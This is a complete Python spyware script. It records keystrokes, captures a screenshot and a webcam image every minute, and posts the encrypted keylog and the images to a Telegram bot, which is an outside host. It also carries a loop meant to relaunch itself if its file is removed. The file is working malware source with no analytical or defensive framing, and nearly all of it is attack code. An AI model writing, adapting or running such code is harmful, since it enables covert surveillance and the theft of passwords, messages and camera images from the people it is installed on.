import logging
import time
import threading
import requests
import cv2
import pyscreenshot as ImageGrab
from pynput import keyboard
from cryptography.fernet import Fernet
import os
import sys

# Load encryption key
def load_key():
    return open("secret.key", "rb").read()

key = load_key()
cipher = Fernet(key)

LOG_FILE = "keylog.txt"
BOT_TOKEN = "your_telegram_bot_token"
CHAT_ID = "your_chat_id"

logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def encrypt_log():
    with open(LOG_FILE, "rb") as file:
        data = file.read()
    return cipher.encrypt(data).decode()

def send_telegram():
    while True:
        time.sleep(60)
        encrypted_data = encrypt_log()
        if encrypted_data:
            message = f"🔒 *Encrypted Keylog Data:*\n```{encrypted_data}```"
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
            requests.post(url, data=payload)
            open(LOG_FILE, "w").close()

telegram_thread = threading.Thread(target=send_telegram, daemon=True)
telegram_thread.start()

# Screenshot capturing function
def capture_screenshot():
    while True:
        time.sleep(60)
        img = ImageGrab.grab()
        img_path = "screenshot.png"
        img.save(img_path)

        # Send the screenshot to Telegram
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(img_path, "rb") as img_file:
            requests.post(url, files={"photo": img_file}, data={"chat_id": CHAT_ID})

screenshot_thread = threading.Thread(target=capture_screenshot, daemon=True)
screenshot_thread.start()

# Webcam capturing function
def capture_webcam():
    while True:
        time.sleep(60)
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            img_path = "webcam.jpg"
            cv2.imwrite(img_path, frame)
            cam.release()

            # Send the webcam image to Telegram
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            with open(img_path, "rb") as img_file:
                requests.post(url, files={"photo": img_file}, data={"chat_id": CHAT_ID})

webcam_thread = threading.Thread(target=capture_webcam, daemon=True)
webcam_thread.start()

# Auto-Restart Mechanism
def restart_if_killed():
    while True:
        time.sleep(5)
        if not os.path.exists(sys.argv[0]):
            os.execv(sys.executable, ['python'] + sys.argv)

restart_thread = threading.Thread(target=restart_if_killed, daemon=True)
restart_thread.start()

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        logging.error("Error: " + str(e))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
